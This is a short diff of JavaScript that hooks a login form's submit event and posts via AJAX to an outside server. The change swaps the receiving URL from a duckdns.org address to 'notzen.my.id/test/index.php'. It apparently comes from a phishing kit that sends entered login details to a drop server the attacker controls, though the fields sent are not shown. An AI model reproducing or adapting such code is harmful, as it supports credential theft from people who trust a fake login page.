@@ -4,7 +4,7 @@ $(".login-form").submit(function() {
 
 	$.ajax({
 
-        url: "http://kintillllll.duckdns.org/test/index.php",
+        url: "http://notzen.my.id/test/index.php",
 
         type: "POST",
 
